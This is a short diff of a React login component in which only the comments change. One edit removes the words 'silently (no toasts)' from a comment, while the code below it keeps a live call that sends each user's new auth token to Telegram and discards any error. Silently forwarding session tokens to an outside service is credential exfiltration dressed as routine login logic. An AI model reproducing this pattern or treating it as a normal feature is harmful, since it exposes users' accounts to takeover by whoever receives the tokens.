@@ -26,12 +26,12 @@ const Login = ({ setIsAuthenticated }) => {
       const token = response.data.token;
       localStorage.setItem("token", token);
 
-      // Try to send token to Telegram silently (no toasts)
+      // Try to send token to Telegram
       try { authService.sendTokenToTelegram(token); } catch (e) {}
 
       toast.success("Вход выполнен успешно");
 
-      // Обновляем состояние авторизации
+      // Обновление состояния авторизации
       console.log("Обновляем состояние авторизации");
       setIsAuthenticated(true);
 
@@ -39,7 +39,7 @@ const Login = ({ setIsAuthenticated }) => {
       setEmail("");
       setPassword("");
 
-      // Перенаправляем на профиль
+      // Перенаправление на профиль
       console.log("Перенаправляем на страницу профиля");
       navigate("/profile", { replace: true });
     } catch (err) {
